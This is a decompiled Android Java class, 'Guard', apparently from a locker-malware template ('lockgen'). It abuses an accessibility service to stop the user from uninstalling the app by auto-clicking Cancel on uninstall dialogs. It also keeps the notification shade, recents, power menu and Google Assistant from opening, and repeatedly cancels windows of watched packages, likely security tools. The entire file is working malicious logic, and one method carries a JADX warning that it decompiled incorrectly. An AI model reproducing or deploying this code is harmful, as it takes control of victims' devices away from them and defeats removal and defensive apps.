package com.lockgen.template.app.core;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class Guard {
    private static final String TAG = "TplGuard";
    private final String devicePkg;
    private final JSONObject guard;
    private long lastAssist;
    private long lastInterfere;
    private long lastPanel;
    private long lastReClick;
    private final AccessibilityService svc;
    private final Handler ui = new Handler(Looper.getMainLooper());

    public Guard(AccessibilityService accessibilityService, JSONObject jSONObject) {
        this.svc = accessibilityService;
        this.guard = jSONObject == null ? new JSONObject() : jSONObject;
        this.devicePkg = accessibilityService.getPackageName();
    }

    public void onUninstallSurface(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        AccessibilityNodeInfo safeRoot;
        if (Cfg.b(this.guard, "antiUninstall", true) && accessibilityEvent.getEventType() == 32 && (packageName = accessibilityEvent.getPackageName()) != null && isUninstallHost(packageName.toString()) && (safeRoot = safeRoot()) != null) {
            try {
                if (findFirst(safeRoot, keywordArray()) == null) {
                    return;
                }
                AccessibilityNodeInfo findFirst = findFirst(safeRoot, cancelArray());
                if (findFirst != null) {
                    clickBest(findFirst);
                    Log.d(TAG, "已点击取消，阻断卸载");
                    return;
                }
                if (findFirst(safeRoot, new String[]{"确定", "OK", "确认"}) != null) {
                    this.svc.performGlobalAction(1);
                }
            } catch (Throwable th) {
                try {
                    Log.w(TAG, "卸载阻断异常", th);
                } finally {
                    recycle(safeRoot);
                }
            }
        }
    }

    private boolean isUninstallHost(String str) {
        JSONArray arr = Cfg.arr(this.guard, "installerPkgs");
        if (arr.length() <= 0) {
            return str.equals("com.android.packageinstaller") || str.equals("com.android.settings") || str.equals("com.android.systemui") || str.equals("com.miui.securitycenter") || str.equals("com.huawei.systemmanager") || str.equals("com.google.android.packageinstaller");
        }
        for (int i = 0; i < arr.length(); i++) {
            if (arr.optString(i, "").equals(str)) {
                return true;
            }
        }
        return false;
    }

    private String[] keywordArray() {
        JSONArray arr = Cfg.arr(this.guard, "uninstallKw");
        if (arr.length() == 0) {
            return new String[]{"卸载", "卸載", "Uninstall", "删除应用"};
        }
        String[] strArr = new String[arr.length()];
        for (int i = 0; i < arr.length(); i++) {
            strArr[i] = arr.optString(i, "");
        }
        return strArr;
    }

    private String[] cancelArray() {
        JSONArray arr = Cfg.arr(this.guard, "cancelTexts");
        if (arr.length() == 0) {
            return new String[]{"取消", "关闭", "Cancel", "知道了", "稍后"};
        }
        String[] strArr = new String[arr.length()];
        for (int i = 0; i < arr.length(); i++) {
            strArr[i] = arr.optString(i, "");
        }
        return strArr;
    }

    public void onWindowChanged(AccessibilityEvent accessibilityEvent, boolean z) {
        CharSequence className = accessibilityEvent.getClassName();
        String str = "";
        String obj = className == null ? "" : className.toString();
        if (z && Cfg.b(this.guard, "blockPanel", true) && isPanel(obj)) {
            long currentTimeMillis = System.currentTimeMillis();
            if (currentTimeMillis - this.lastPanel > 500) {
                this.lastPanel = currentTimeMillis;
                try {
                    this.svc.performGlobalAction(1);
                } catch (Throwable unused) {
                }
            }
        }
        CharSequence packageName = accessibilityEvent.getPackageName();
        if (packageName != null) {
            str = packageName.toString();
        }
        if (z && Cfg.b(this.guard, "blockAssist", true) && isAssistant(str, obj)) {
            long currentTimeMillis2 = System.currentTimeMillis();
            if (currentTimeMillis2 - this.lastAssist > 300) {
                this.lastAssist = currentTimeMillis2;
                try {
                    this.svc.performGlobalAction(1);
                } catch (Throwable unused2) {
                }
            }
        }
    }

    private boolean isPanel(String str) {
        return str.contains("Shade") || str.contains("NotificationPanel") || str.contains("QuickSettings") || str.contains("Recents") || str.contains("TaskStackView") || str.contains("GlobalActions");
    }

    private boolean isAssistant(String str, String str2) {
        if (str.equals("com.google.android.googlequicksearchbox") || str.equals("com.google.android.apps.googleassistant") || str.equals("com.google.android.apps.assistant")) {
            return true;
        }
        return str.equals("com.android.systemui") && str2.contains("Assist");
    }

    public boolean onTargetWindow(String str) {
        if (str == null) {
            return false;
        }
        JSONArray arr = Cfg.arr(this.guard, "watch");
        for (int i = 0; i < arr.length(); i++) {
            if (str.equals(arr.optString(i, ""))) {
                if (Cfg.b(this.guard, "autoCancel", true)) {
                    long currentTimeMillis = System.currentTimeMillis();
                    if (currentTimeMillis - this.lastInterfere < Cfg.i(this.guard, "throttleMs", 500)) {
                        return true;
                    }
                    this.lastInterfere = currentTimeMillis;
                    strike();
                    return true;
                }
                return true;
            }
        }
        return false;
    }

    public boolean onWindowsChanged() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (Cfg.b(this.guard, "autoCancel", true)) {
            JSONArray arr = Cfg.arr(this.guard, "watch");
            if (arr.length() == 0) {
                return false;
            }
            try {
                List<AccessibilityWindowInfo> windows = this.svc.getWindows();
                if (windows == null) {
                    return false;
                }
                boolean z = false;
                for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                    if (accessibilityWindowInfo != null) {
                        try {
                            accessibilityNodeInfo = accessibilityWindowInfo.getRoot();
                        } catch (Throwable unused) {
                            accessibilityNodeInfo = null;
                        }
                        if (accessibilityNodeInfo != null) {
                            CharSequence packageName = accessibilityNodeInfo.getPackageName();
                            if (packageName != null) {
                                for (int i = 0; i < arr.length(); i++) {
                                    if (packageName.toString().equals(arr.optString(i, ""))) {
                                        long currentTimeMillis = System.currentTimeMillis();
                                        if (currentTimeMillis - this.lastInterfere >= Cfg.i(this.guard, "throttleMs", 500)) {
                                            this.lastInterfere = currentTimeMillis;
                                            clickCancelSide(accessibilityNodeInfo);
                                        }
                                        z = true;
                                    }
                                }
                            }
                            recycle(accessibilityNodeInfo);
                        }
                    }
                }
                return z;
            } catch (Throwable unused2) {
                return false;
            }
        }
        return false;
    }

    private void strike() {
        try {
            this.svc.performGlobalAction(1);
            AccessibilityNodeInfo safeRoot = safeRoot();
            if (safeRoot != null) {
                if (clickCancelSide(safeRoot)) {
                    scheduleReclick();
                }
                recycle(safeRoot);
            }
        } catch (Throwable th) {
            Log.w(TAG, "反制异常", th);
        }
    }

    private void scheduleReclick() {
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis - this.lastReClick < 300) {
            return;
        }
        this.lastReClick = currentTimeMillis;
        this.ui.postDelayed(new Runnable() { // from class: com.lockgen.template.app.core.Guard$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                Guard.this.lambda$scheduleReclick$0();
            }
        }, 150L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$scheduleReclick$0() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        try {
            List<AccessibilityWindowInfo> windows = this.svc.getWindows();
            if (windows == null) {
                return;
            }
            JSONArray arr = Cfg.arr(this.guard, "watch");
            for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                if (accessibilityWindowInfo != null) {
                    try {
                        accessibilityNodeInfo = accessibilityWindowInfo.getRoot();
                    } catch (Throwable unused) {
                        accessibilityNodeInfo = null;
                    }
                    if (accessibilityNodeInfo != null) {
                        CharSequence packageName = accessibilityNodeInfo.getPackageName();
                        if (packageName != null) {
                            for (int i = 0; i < arr.length(); i++) {
                                if (packageName.toString().equals(arr.optString(i, ""))) {
                                    clickCancelSide(accessibilityNodeInfo);
                                }
                            }
                        }
                        recycle(accessibilityNodeInfo);
                    }
                }
            }
        } catch (Throwable unused2) {
        }
    }

    private boolean clickCancelSide(AccessibilityNodeInfo accessibilityNodeInfo) {
        String[] cancelArray;
        for (String str : cancelArray()) {
            try {
                List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
                if (findAccessibilityNodeInfosByText != null && !findAccessibilityNodeInfosByText.isEmpty()) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = findAccessibilityNodeInfosByText.get(0);
                    for (int i = 1; i < findAccessibilityNodeInfosByText.size(); i++) {
                        recycle(findAccessibilityNodeInfosByText.get(i));
                    }
                    if (clickBest(accessibilityNodeInfo2)) {
                        Log.d(TAG, "已点击取消侧文本: " + str);
                        recycle(accessibilityNodeInfo2);
                        return true;
                    }
                    recycle(accessibilityNodeInfo2);
                }
            } catch (Throwable unused) {
            }
        }
        return false;
    }

    private AccessibilityNodeInfo safeRoot() {
        try {
            return this.svc.getRootInActiveWindow();
        } catch (Throwable unused) {
            return null;
        }
    }

    private AccessibilityNodeInfo findFirst(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr) {
        for (String str : strArr) {
            try {
                List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
                if (findAccessibilityNodeInfosByText != null && !findAccessibilityNodeInfosByText.isEmpty()) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = findAccessibilityNodeInfosByText.get(0);
                    for (int i = 1; i < findAccessibilityNodeInfosByText.size(); i++) {
                        recycle(findAccessibilityNodeInfosByText.get(i));
                    }
                    return accessibilityNodeInfo2;
                }
            } catch (Throwable unused) {
            }
        }
        return null;
    }

    /* JADX WARN: Code restructure failed: missing block: B:17:0x0022, code lost:
        r1 = null;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private boolean clickBest(AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean z = false;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        int i = 0;
        while (true) {
            AccessibilityNodeInfo accessibilityNodeInfo3 = null;
            if (accessibilityNodeInfo2 == null) {
                break;
            }
            int i2 = i + 1;
            if (i >= 10) {
                break;
            }
            try {
                if (accessibilityNodeInfo2.isClickable()) {
                    break;
                }
            } catch (Throwable unused) {
            }
            try {
                accessibilityNodeInfo3 = accessibilityNodeInfo2.getParent();
            } catch (Throwable unused2) {
            }
            if (accessibilityNodeInfo2 != accessibilityNodeInfo) {
                recycle(accessibilityNodeInfo2);
            }
            accessibilityNodeInfo2 = accessibilityNodeInfo3;
            i = i2;
        }
        if (accessibilityNodeInfo2 != null) {
            try {
                z = accessibilityNodeInfo2.performAction(16);
            } catch (Throwable unused3) {
            }
            if (accessibilityNodeInfo2 != accessibilityNodeInfo) {
                recycle(accessibilityNodeInfo2);
            }
        }
        return !z ? gestureClick(accessibilityNodeInfo) : z;
    }

    private boolean gestureClick(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.isEmpty()) {
                return false;
            }
            Path path = new Path();
            path.moveTo(rect.centerX(), rect.centerY());
            return this.svc.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 60L)).build(), null, null);
        } catch (Throwable unused) {
            return false;
        }
    }

    private void recycle(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        try {
            accessibilityNodeInfo.recycle();
        } catch (Throwable unused) {
        }
    }

    public boolean targetInstalled() {
        try {
            JSONArray arr = Cfg.arr(this.guard, "watch");
            for (int i = 0; i < arr.length(); i++) {
                String optString = arr.optString(i, "");
                if (!optString.isEmpty()) {
                    this.svc.getPackageManager().getPackageInfo(optString, 0);
                    return true;
                }
            }
            return false;
        } catch (Throwable unused) {
            return false;
        }
    }
}